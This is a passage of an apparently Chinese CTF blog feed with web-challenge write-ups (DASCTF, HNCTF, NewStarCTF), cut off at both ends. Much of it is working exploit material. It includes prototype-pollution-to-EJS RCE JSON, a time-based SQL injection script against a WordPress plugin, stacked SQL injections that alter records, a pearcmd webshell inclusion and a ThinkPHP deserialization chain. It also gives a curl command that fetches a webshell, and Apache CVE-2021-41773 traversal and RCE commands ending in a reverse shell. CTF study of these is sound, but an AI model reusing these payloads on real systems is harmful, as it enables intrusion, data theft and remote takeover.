src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207213715388.png" alt="image-20230207213715388"></p><p>在自己服务器上搭个恶意的dtd文件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207213808758.png" alt="image-20230207213808758"></p><p>然后在提交的时候外部引入这个文件</p><p>这里是直接报错把提交的内容显示出来了，如果没显示就在服务器上监听一下端口就行。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207213928767.png" alt="image-20230207213928767"></p><h2 id="Shared-Diary"><a href="#Shared-Diary" class="headerlink" title="Shared Diary"></a>Shared Diary</h2><blockquote><p>ek1ng给协会成员写了一个在线共享日记本，不论是谁只要知道密码，都可以在上面记录自己的小秘密。不过好像他的js学的并不好导致无意中引入了漏洞，看来js也有很多安全问题。</p></blockquote><p>看见js第一时间想到的就应该是原型链污染</p><p>merge函数，存在原型链污染</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207214312053.png" alt="image-20230207214312053"></p><p>但是这里__proto__被过滤了，可以使用.constructor.prototype来替代</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207214501527.png" alt="image-20230207214501527"></p><p>这里表示能接收json类型的参数</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207215143916.png" alt="image-20230207215143916"></p><p>这里我们先把角色污染为admin试一下</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207215536438.png" alt="image-20230207215536438"></p><p>登陆成功，但是还是没有flag，根据给的源码可以猜测这里应该还需要利用一个ejs的漏洞才能拿到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207215730542.png" alt="image-20230207215730542"></p><p>两种方式，一种是ejs的模板注入，可以插⼊ &lt;%- %&gt; 标签来执⾏任意js，能够直接完成RCE。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207221140659.png" alt="image-20230207221140659"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207220748847.png" alt="image-20230207220748847"></p><p>还有一种就是借助原型链污染实现ejs的rce</p><pre class="language-txt" data-language="txt"><code class="language-txt">&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;role&quot;:&quot;admin&quot;,&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat &#x2F;flag&#39;);&quot;&#125;&#125;,&quot;username&quot;:&quot;1&quot;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207224728259.png" alt="image-20230207224728259"><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230207224746850.png" alt="image-20230207224746850"></p><p>参考文章：</p><p><a href="https://www.anquanke.com/post/id/236354">https://www.anquanke.com/post/id/236354</a></p><p><a href="https://blog.vvbbnn00.cn/archives/hgame2023week4-bu-fen-writeup">https://blog.vvbbnn00.cn/archives/hgame2023week4-bu-fen-writeup</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF X GFCTF wp</title>
      <link href="/2022/11/11/DASCTFxGFCTF%20wp/"/>
      <url>/2022/11/11/DASCTFxGFCTF%20wp/</url>
      
        <content type="html"><![CDATA[<h2 id="hade-waibo"><a href="#hade-waibo" class="headerlink" title="hade_waibo"></a>hade_waibo</h2><p>非预期就是先读start.sh文件，找到flag位置后读flag文件</p><p><strong>预期解</strong></p><pre class="language-php" data-language="php"><code class="language-php">#index.php&lt;?phperror_reporting(0);session_start();include &#39;class.php&#39;;if(isset($_POST[&#39;username&#39;]) &amp;&amp; $_POST[&#39;username&#39;]!&#x3D;&#39;&#39;)&#123;#修复了登录还需要passwd的漏洞$user &#x3D; new User($_POST[&#39;username&#39;]);&#125;if($_SESSION[&#39;isLogin&#39;])&#123;die(&quot;&lt;script&gt;alert(&#39;Login success!&#39;);location.href&#x3D;&#39;file.php&#39;&lt;&#x2F;script&gt;&quot;);&#125;else&#123;die(&#39;&lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot;&gt;&lt;div class&#x3D;&quot;ui input&quot;&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; placeholder&#x3D;&quot;Give me uname&quot; maxlength&#x3D;&quot;6&quot;&gt;&lt;&#x2F;div&gt;&lt;form&gt;&#39;);&#125;</code></pre><pre class="language-php" data-language="php"><code class="language-php">#class.php&lt;?phpclass User&#123;    public $username;    public function __construct($username)&#123;        $this-&gt;username &#x3D; $username;        $_SESSION[&#39;isLogin&#39;] &#x3D; True;        $_SESSION[&#39;username&#39;] &#x3D; $username;    &#125;    public function __wakeup()&#123;        $cklen &#x3D; strlen($_SESSION[&quot;username&quot;]);        if ($cklen !&#x3D; 0 and $cklen &lt;&#x3D; 6) &#123;            $this-&gt;username &#x3D; $_SESSION[&quot;username&quot;];        &#125;    &#125;    public function __destruct()&#123;        if ($this-&gt;username &#x3D;&#x3D; &#39;&#39;) &#123;            session_destroy();        &#125;    &#125;&#125;class File&#123;    #更新黑名单为白名单，更加的安全    public $white &#x3D; array(&quot;jpg&quot;,&quot;png&quot;);    public function show($filename)&#123;        echo &#39;&lt;div class&#x3D;&quot;ui action input&quot;&gt;&lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;filename&quot; placeholder&#x3D;&quot;Search...&quot;&gt;&lt;button class&#x3D;&quot;ui button&quot; onclick&#x3D;&quot;window.location.href&#x3D;\&#39;file.php?m&#x3D;show&amp;filename&#x3D;\&#39;+document.getElementById(\&#39;filename\&#39;).value&quot;&gt;Search&lt;&#x2F;button&gt;&lt;&#x2F;div&gt;&lt;p&gt;&#39;;        if(empty($filename))&#123;die();&#125;        return &#39;&lt;img src&#x3D;&quot;data:image&#x2F;png;base64,&#39;.base64_encode(file_get_contents($filename)).&#39;&quot; &#x2F;&gt;&#39;;    &#125;    public function upload($type)&#123;        $filename &#x3D; &quot;dasctf&quot;.md5(time().$_FILES[&quot;file&quot;][&quot;name&quot;]).&quot;.$type&quot;;        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload&#x2F;&quot; . $filename);        return &quot;Upload success! Path: upload&#x2F;&quot; . $filename;    &#125;    public function rmfile()&#123;        system(&#39;rm -rf &#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;*&#39;);    &#125;    public function check($type)&#123;        if (!in_array($type,$this-&gt;white))&#123;            return false;        &#125;        return true;    &#125;&#125;#更新了一个恶意又有趣的Test类class Test&#123;    public $value;    public function __destruct()&#123;        chdir(&#39;.&#x2F;upload&#39;);        $this-&gt;backdoor();    &#125;    public function __wakeup()&#123;        $this-&gt;value &#x3D; &quot;Don&#39;t make dream.Wake up plz!&quot;;    &#125;    public function __toString()&#123;        $file &#x3D; substr($_GET[&#39;file&#39;],0,3);        file_put_contents($file, &quot;Hack by $file !&quot;);        return &#39;Unreachable! :)&#39;;    &#125;    public function backdoor()&#123;        if(preg_match(&#39;&#x2F;[A-Za-z0-9?$@]+&#x2F;&#39;, $this-&gt;value))&#123;            $this-&gt;value &#x3D; &#39;nono~&#39;;        &#125;        system($this-&gt;value);    &#125;&#125;</code></pre><pre class="language-php" data-language="php"><code class="language-php">#file.php&lt;?phperror_reporting(0);session_start();include &#39;class.php&#39;;$file &#x3D; new file();switch ($_GET[&#39;m&#39;]) &#123;case &#39;upload&#39;:if(empty($_FILES))&#123;die($form);&#125;$type &#x3D; end(explode(&quot;.&quot;, $_FILES[&#39;file&#39;][&#39;name&#39;]));if ($file-&gt;check($type)) &#123;die($file-&gt;upload($type));&#125;else&#123;die(&#39;你食不食油饼🤬&#39;);&#125;break;case &#39;show&#39;:die($file-&gt;show($_GET[&#39;filename&#39;]));break;case &#39;rm&#39;:$file-&gt;rmfile();die(&quot;全删干净了捏😋&quot;);break;case &#39;logout&#39;:session_destroy();die(&quot;&lt;script&gt;alert(&#39;已退出登录&#39;);location.href&#x3D;&#39;index.php&#39;&lt;&#x2F;script&gt;&quot;);break;default:echo &#39;&lt;h2&gt;Halo! &#39;.$_SESSION[&#39;username&#39;].&#39;&lt;&#x2F;h2&gt;&#39;;break;&#125;?&gt;</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>一些web题</title>
      <link href="/2022/10/20/%E4%B8%80%E4%BA%9Bweb%E9%A2%98/"/>
      <url>/2022/10/20/%E4%B8%80%E4%BA%9Bweb%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSRound-1"><a href="#NSSRound-1" class="headerlink" title="NSSRound#1"></a>NSSRound#1</h1><h2 id="basic-check"><a href="#basic-check" class="headerlink" title="basic_check"></a>basic_check</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020125928977.png" alt="image-20221020125928977"></p><p>打开之后只有一行代码，这里需要用nikto扫一下</p><pre class="language-none"><code class="language-none">Nikto是一款开放源代码的、功能强大的WEB扫描评估软件，能对web服务器多种安全项目进行测试的扫描软件，能在230多种服务器上扫描出2600多种有潜在危险的文件、CGI及其他问题，它可以扫描指定主机的WEB类型、主机名、特定目录、COOKIE、特定CGI漏洞、返回主机允许的http模式等等。它也使用LibWhiske库，但通常比Whisker更新的更为频繁。Nikto是网管安全人员必备的WEB审计工具之一。</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020130901005.png" alt="image-20221020130901005"></p><p>显示可以通过put直接上传文件，直接写马</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020131504539.png" alt="image-20221020131504539"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020131544382.png" alt="image-20221020131544382"></p><h1 id="HNCTF"><a href="#HNCTF" class="headerlink" title="HNCTF"></a>HNCTF</h1><h2 id="Week1-Challenge-rce"><a href="#Week1-Challenge-rce" class="headerlink" title="[Week1]Challenge__rce"></a>[Week1]Challenge__rce</h2><p>自增的rce，但是有一些特别的姿势</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);if (isset($_GET[&#39;hint&#39;])) &#123;    highlight_file(__FILE__);&#125;if (isset($_POST[&#39;rce&#39;])) &#123;    $rce &#x3D; $_POST[&#39;rce&#39;];    if (strlen($rce) &lt;&#x3D; 120) &#123;        if (is_string($rce)) &#123;            if (!preg_match(&quot;&#x2F;[!@#%^&amp;*:&#39;\-&lt;?&gt;\&quot;\&#x2F;|&#96;a-zA-Z~\\\\]&#x2F;&quot;, $rce)) &#123;                eval($rce);            &#125; else &#123;                echo(&quot;Are you hack me?&quot;);            &#125;        &#125; else &#123;            echo &quot;I want string!&quot;;        &#125;    &#125; else &#123;        echo &quot;too long!&quot;;    &#125;&#125;</code></pre><p>过滤了很多，只能用 <code>$ _ () [] &#123;&#125; , . = + ;</code> 和数字 0-9 以及其它非 A-Z a-iz 的 Unicode 字符。但是如果参考p牛博客里的自增rce姿势的话长度又会超出限制。题目的 hint <code>灵感来源于 ctfshow 七夕杯的 shellme_revenge</code>, 那题用的是 php<code>0/0=NAN和1/0=INF</code> 的特性，但是需要 <code>/</code> 运算符参与。而这道题里是通过构造chr函数，然后再利用chr来构造$_GET，chr的每个字母都可以通过数组类型Array取出来。</p><pre class="language-php" data-language="php"><code class="language-php">$_&#x3D;([].¥)&#123;3&#125;;$_++;$_.&#x3D;++$_;$_++;$_++;$_++; $_++;$_++;$_.&#x3D;([].¥)&#123;2&#125;;$_&#x3D;_.$_(71).$_(69).$_(84);($$_&#123;0&#125;)($$_&#123;1&#125;);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221031204900971.png" alt="image-20221031204900971"></p><h2 id="WEEK2-ez-ssrf"><a href="#WEEK2-ez-ssrf" class="headerlink" title="[WEEK2]ez_ssrf"></a>[WEEK2]ez_ssrf</h2><p>flag在flag.php下，要求本地登录，这里不是修改xff和referer头可以实现的，看index.php里的代码就能猜到是关于ssrf的题。看到fsockopen函数，然后我们可以控制ip，port和data，所以只要将ip设置为127.0.0.1，port=80，data为我们构造的http请求包，就可以实现本地登录</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221031205410187.png" alt="image-20221031205410187"></p><p>编码之后提交</p><pre class="language-txt" data-language="txt"><code class="language-txt">host&#x3D;127.0.0.1&amp;port&#x3D;80&amp;data&#x3D;R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo%3d</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221031205549928.png" alt="image-20221031205549928"></p><h2 id="WEEK2-easy-unser"><a href="#WEEK2-easy-unser" class="headerlink" title="[WEEK2]easy_unser"></a>[WEEK2]easy_unser</h2><p>没啥好写的，就记住<strong>is_file不将伪协议当作文件，但highlight_file认为伪协议可以是文件</strong>就行了</p><h2 id="WEEK2-Ohmywordpress"><a href="#WEEK2-Ohmywordpress" class="headerlink" title="[WEEK2]Ohmywordpress"></a>[WEEK2]Ohmywordpress</h2><p>wordpress这里有两个插件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221031213354058.png" alt="image-20221031213354058"></p><p>其中 simple-link-directory, 存在 sql 注入</p><p><a href="https://wpscan.com/vulnerability/1c83ed73-ef02-45c0-a9ab-68a3468d2210">https://wpscan.com/vulnerability/1c83ed73-ef02-45c0-a9ab-68a3468d2210</a></p><p>payload</p><pre class="language-txt" data-language="txt"><code class="language-txt">curl &#39;http:&#x2F;&#x2F;example.com&#x2F;wp-admin&#x2F;admin-ajax.php&#39; --data &#39;action&#x3D;qcopd_upvote_action&amp;post_id&#x3D;(SELECT 3 FROM (SELECT SLEEP(5))enz)&#39; </code></pre><p>后边就是sql时间盲注了</p><p>抄了个脚本</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport timeurl &#x3D; &#39;http:&#x2F;&#x2F;1.14.71.254:28504&#x2F;wp-admin&#x2F;admin-ajax.php&#39;dicts &#x3D; r&#39;NSSCTF&#123;-abcdef0123456789&#125;&#39;flag &#x3D; &#39;&#39;for i in range(1,99999):    for s in dicts:        payload &#x3D; &quot;(SELECT 3 FROM (SELECT if(ascii(substr((select group_concat(flag) from ctftraining.flag),&#123;&#125;,1))&#x3D;&#123;&#125;, sleep(5),0))enz)&quot;.format(i,ord(s))        start_time &#x3D; time.time()        print(s)        res &#x3D; requests.post(url,data&#x3D;&#123;            &#39;action&#39;: &#39;qcopd_upvote_action&#39;,            &#39;post_id&#39;: payload            &#125;)        stop_time &#x3D; time.time()        if stop_time - start_time &gt;&#x3D; 5:            flag +&#x3D; s            print(&#39;FOUND!!!&#39;,flag)            break</code></pre><h2 id="WEEK3-Fun-php"><a href="#WEEK3-Fun-php" class="headerlink" title="[WEEK3]Fun_php"></a>[WEEK3]Fun_php</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF</title>
      <link href="/2022/09/25/NewStarCTF/"/>
      <url>/2022/09/25/NewStarCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h2><p>第一周web太简单不想写</p><h2 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h2><h3 id="IncludeOne"><a href="#IncludeOne" class="headerlink" title="IncludeOne"></a>IncludeOne</h3><pre class="language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;seed.php&quot;);&#x2F;&#x2F;mt_srand(*********);echo &quot;Hint: &quot;.mt_rand().&quot;&lt;br&gt;&quot;;if(isset($_POST[&#39;guess&#39;]) &amp;&amp; md5($_POST[&#39;guess&#39;]) &#x3D;&#x3D;&#x3D; md5(mt_rand()))&#123;    if(!preg_match(&quot;&#x2F;base|\.\.&#x2F;i&quot;,$_GET[&#39;file&#39;]) &amp;&amp; preg_match(&quot;&#x2F;NewStar&#x2F;i&quot;,$_GET[&#39;file&#39;]) &amp;&amp; isset($_GET[&#39;file&#39;]))&#123;        &#x2F;&#x2F;flag in &#96;flag.php&#96;        include($_GET[&#39;file&#39;]);    &#125;else&#123;        echo &quot;Baby Hacker?&quot;;    &#125;&#125;else&#123;    echo &quot;No Hacker!&quot;;&#125; </code></pre><p>先是个伪随机，然后绕过if判断</p><p>伪随机就直接爆种子然后挨个试就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220925223642254.png" alt="image-20220925223642254"></p><p>然后是绕过if，不让有base，还要有newstar，用伪协议就行。</p><p>PHP伪协议可以将某个文件或文件夹包含在其中</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220925223827996.png" alt="image-20220925223827996"></p><p>f12看见flag.php的内容，然后rot13解码。</p><h3 id="UnserializeOne"><a href="#UnserializeOne" class="headerlink" title="UnserializeOne"></a>UnserializeOne</h3><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass Start&#123;    public $name;    public $func;    public function __destruct()    &#123;        echo &quot;Welcome to NewStarCTF, &quot;.$this-&gt;name;    &#125;    public function __isset($var)    &#123;        ($this-&gt;func)();    &#125;&#125;class Sec&#123;    private $obj;    private $var;    public function __toString()    &#123;        $this-&gt;obj-&gt;check($this-&gt;var);        return &quot;CTFers&quot;;    &#125;    public function __invoke()    &#123;        echo file_get_contents(&#39;&#x2F;flag&#39;);    &#125;&#125;class Easy&#123;    public $cla;    public function __call($fun, $var)    &#123;        $this-&gt;cla &#x3D; clone $var[0];    &#125;&#125;class eeee&#123;    public $obj;    public function __clone()    &#123;        if(isset($this-&gt;obj-&gt;cmd))&#123;            echo &quot;success&quot;;        &#125;&#125;&#125;$a &#x3D; new Start();$a -&gt;name &#x3D; new Sec();$a -&gt;name-&gt;obj &#x3D; new Easy();$a -&gt;name-&gt;var &#x3D; new eeee();$a -&gt;name-&gt;var-&gt;obj &#x3D; new Start();$a -&gt;name-&gt;var-&gt;obj-&gt;func &#x3D; new Sec();#payload#O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;O:4:&quot;Easy&quot;:1:&#123;s:3:&quot;cla&quot;;N;&#125;s:3:&quot;var&quot;;O:4:&quot;eeee&quot;:1:&#123;s:3:&quot;obj&quot;;O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;N;s:4:&quot;func&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;N;s:3:&quot;var&quot;;N;&#125;&#125;&#125;&#125;s:4:&quot;func&quot;;N;&#125;</code></pre><p>可以利用对于PHP版本7.1+，对属性的类型不敏感，我们可以将protected类型改为public，以消除不可打印字符。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220925231137367.png" alt="image-20220925231137367"></p><h3 id="Word-For-You-2-Gen"><a href="#Word-For-You-2-Gen" class="headerlink" title="Word-For-You(2 Gen)"></a>Word-For-You(2 Gen)</h3><p>报错注入就行</p><p>flag在wfy_comment表的id=100那行</p><h3 id="ezAPI"><a href="#ezAPI" class="headerlink" title="ezAPI"></a>ezAPI</h3><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);$id &#x3D; $_POST[&#39;id&#39;];function waf($str)&#123;    if (!is_numeric($str) || preg_replace(&quot;&#x2F;[0-9]&#x2F;&quot;, &quot;&quot;, $str) !&#x3D;&#x3D; &quot;&quot;) &#123;        return False;    &#125; else &#123;        return True;    &#125;&#125;function send($data)&#123;    $options &#x3D; array(        &#39;http&#39; &#x3D;&gt; array(            &#39;method&#39; &#x3D;&gt; &#39;POST&#39;,            &#39;header&#39; &#x3D;&gt; &#39;Content-type: application&#x2F;json&#39;,            &#39;content&#39; &#x3D;&gt; $data,            &#39;timeout&#39; &#x3D;&gt; 10 * 60        )    );    $context &#x3D; stream_context_create($options);    $result &#x3D; file_get_contents(&quot;http:&#x2F;&#x2F;graphql:8080&#x2F;v1&#x2F;graphql&quot;, false, $context);    return $result;&#125;if (isset($id)) &#123;    if (waf($id)) &#123;        isset($_POST[&#39;data&#39;]) ? $data &#x3D; $_POST[&#39;data&#39;] : $data &#x3D; &#39;&#123;&quot;query&quot;:&quot;query&#123;\nusers_user_by_pk(id:&#39; . $id . &#39;) &#123;\nname\n&#125;\n&#125;\n&quot;, &quot;variables&quot;:null&#125;&#39;;        $res &#x3D; json_decode(send($data));        if ($res-&gt;data-&gt;users_user_by_pk-&gt;name !&#x3D;&#x3D; NULL) &#123;            echo &quot;ID: &quot; . $id . &quot;&lt;br&gt;Name: &quot; . $res-&gt;data-&gt;users_user_by_pk-&gt;name;        &#125; else &#123;            echo &quot;&lt;b&gt;Can&#39;t found it!&lt;&#x2F;b&gt;&lt;br&gt;&lt;br&gt;DEBUG: &quot;;            var_dump($res-&gt;data);        &#125;    &#125; else &#123;        die(&quot;&lt;b&gt;Hacker! Only Number!&lt;&#x2F;b&gt;&quot;);    &#125;&#125; else &#123;    die(&quot;&lt;b&gt;No Data?&lt;&#x2F;b&gt;&quot;);&#125;?&gt;</code></pre><p>本来以为会是一个stream_context_create的crlf漏洞，然后发现其实是graphql的安全问题</p><p><a href="https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ">玩转graphQL (qq.com)</a></p><p>具体的看这个就行</p><p>先用内省查询获得数据</p><pre class="language-txt" data-language="txt"><code class="language-txt">&#123;&quot;query&quot;:&quot;\n    query IntrospectionQuery &#123;\r\n      __schema &#123;\r\n        queryType &#123; name &#125;\r\n        mutationType &#123; name &#125;\r\n        subscriptionType &#123; name &#125;\r\n        types &#123;\r\n          ...FullType\r\n        &#125;\r\n        directives &#123;\r\n          name\r\n          description\r\n          locations\r\n          args &#123;\r\n            ...InputValue\r\n          &#125;\r\n        &#125;\r\n      &#125;\r\n    &#125;\r\n\r\n    fragment FullType on __Type &#123;\r\n      kind\r\n      name\r\n      description\r\n      fields(includeDeprecated: true) &#123;\r\n        name\r\n        description\r\n        args &#123;\r\n          ...InputValue\r\n        &#125;\r\n        type &#123;\r\n          ...TypeRef\r\n        &#125;\r\n        isDeprecated\r\n        deprecationReason\r\n      &#125;\r\n      inputFields &#123;\r\n        ...InputValue\r\n      &#125;\r\n      interfaces &#123;\r\n        ...TypeRef\r\n      &#125;\r\n      enumValues(includeDeprecated: true) &#123;\r\n        name\r\n        description\r\n        isDeprecated\r\n        deprecationReason\r\n      &#125;\r\n      possibleTypes &#123;\r\n        ...TypeRef\r\n      &#125;\r\n    &#125;\r\n\r\n    fragment InputValue on __InputValue &#123;\r\n      name\r\n      description\r\n      type &#123; ...TypeRef &#125;\r\n      defaultValue\r\n    &#125;\r\n\r\n    fragment TypeRef on __Type &#123;\r\n      kind\r\n      name\r\n      ofType &#123;\r\n        kind\r\n        name\r\n        ofType &#123;\r\n          kind\r\n          name\r\n          ofType &#123;\r\n            kind\r\n            name\r\n            ofType &#123;\r\n              kind\r\n              name\r\n              ofType &#123;\r\n                kind\r\n                name\r\n                ofType &#123;\r\n                  kind\r\n                  name\r\n                  ofType &#123;\r\n                    kind\r\n                    name\r\n                  &#125;\r\n                &#125;\r\n              &#125;\r\n            &#125;\r\n          &#125;\r\n        &#125;\r\n      &#125;\r\n    &#125;\r\n  &quot;,&quot;variables&quot;:null&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220927144312348.png" alt="image-20220927144312348"></p><p>找到flag在的地方，然后查询</p><p><code>&amp;data=&#123;&quot;query&quot;:&quot;query&#123;\nffffllllaaagggg_1n_h3r3_flag &#123;\nflag\n&#125;\n&#125;\n&quot;, &quot;variables&quot;:null&#125;</code></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220927142726823.png" alt="image-20220927142726823"></p><h2 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h2><h3 id="BabySSTI-One"><a href="#BabySSTI-One" class="headerlink" title="BabySSTI_One"></a>BabySSTI_One</h3><p>直接用之前珍藏的那个ssti payload往里写马</p><h3 id="multiSQL"><a href="#multiSQL" class="headerlink" title="multiSQL"></a>multiSQL</h3><p>1&#39;;show tables;#</p><p>1&#39;;show columns from score;#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221003220711088.png" alt="image-20221003220711088"></p><p>改成绩</p><p>1&#39;;SET @sqli=concat(char(117,112,100,97,116,101),&#39; <code>score</code> SET  listen= 221&#39;);PREPARE hacker from @sqli;EXECUTE hacker;#</p><p>1&#39;;SET @sqli=concat(char(115,101,108,101,99,116),&#39;* from score&#39;);PREPARE hacker from @sqli;EXECUTE hacker;#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221003222246387.png" alt="image-20221003222246387"></p><p>验证</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221003222306150.png" alt="image-20221003222306150"></p><h3 id="IncludeTwo"><a href="#IncludeTwo" class="headerlink" title="IncludeTwo"></a>IncludeTwo</h3><p>pear文件包含rce</p><pre class="language-none"><code class="language-none">?file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd&amp;+config-create+&#x2F;&lt;?&#x3D;eval($_POST[a]);?&gt;+&#x2F;tmp&#x2F;hello.php</code></pre><p>然后包含hello.php</p><p>TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NDp7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJ3aG9hbWkiO31zOjIxOiIAdGhpbmtcTW9kZWwAd2l0aEF0dHIiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJzeXN0ZW0iO31zOjk6IgAqAGFwcGVuZCI7YToxOntzOjU6InNvNG1zIjthOjA6e319czo4OiJyZWxhdGlvbiI7YjowO319fQ</p><h3 id="Maybe-You-Have-To-think-More"><a href="#Maybe-You-Have-To-think-More" class="headerlink" title="Maybe You Have To think More"></a>Maybe You Have To think More</h3><p>好怪的题目，不给源码的反序列化可还行</p><p>cookie里是序列化的内容，然后通过报错可以得到是tp5.1.41的版本。直接去网上找现成的反序列化链子。</p><p>正好有个对应版本的反序列化链，但是不知道为啥拿到的payload没法用，可能是源码不太一样</p><p><a href="https://www.freebuf.com/vuls/269882.html">https://www.freebuf.com/vuls/269882.html</a></p><p>这里我们用这个</p><p><a href="https://blog.csdn.net/weixin_54902210/article/details/124874209">ThinkPHP5.1反序列化漏洞_Sentiment.的博客-CSDN博客_thinkphp5.1漏洞</a></p><p><a href="https://www.freebuf.com/vuls/263977.html">https://www.freebuf.com/vuls/263977.html</a></p><p>与文章里唯一的不同就是要把序列化的内容放了cookie里。</p><p>然后在环境变量里可以找到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221004150141562.png" alt="image-20221004150141562"></p><h2 id="WEEK4"><a href="#WEEK4" class="headerlink" title="WEEK4"></a>WEEK4</h2><h3 id="So-Baby-RCE"><a href="#So-Baby-RCE" class="headerlink" title="So Baby RCE"></a>So Baby RCE</h3><p>两种方法：</p><p>一种是用&amp;&amp;来连接命令，使用cd来穿越目录，然后用sort来读取</p><p>cmd=cd%09..%26%26cd%09..%26%26cd%09..%26%26sort%09ffff?lllaaaaggggg </p><p>另一种是curl种马</p><p>cmd=curl%09-o%091.php%09ip</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020143124846.png" alt="image-20221020143124846"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020143202810.png" alt="image-20221020143202810"></p><h2 id="WEEK5"><a href="#WEEK5" class="headerlink" title="WEEK5"></a>WEEK5</h2><h3 id="Unsafe-Apache"><a href="#Unsafe-Apache" class="headerlink" title="Unsafe Apache"></a>Unsafe Apache</h3><pre class="language-none"><code class="language-none">CVE-2021-41773</code></pre><p>影响版本：<code>Apache 2.4.49</code></p><p>poc:</p><pre class="language-none"><code class="language-none">curl -v --path-as-is http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;icons&#x2F;.%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;etc&#x2F;passwdcurl -v --data &quot;echo;id&quot; &#39;http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;cgi-bin&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;bin&#x2F;sh&#39;curl -s --path-as-is -d &#39;echo Content-Type: text&#x2F;plain; echo; bash -i &gt;&amp; 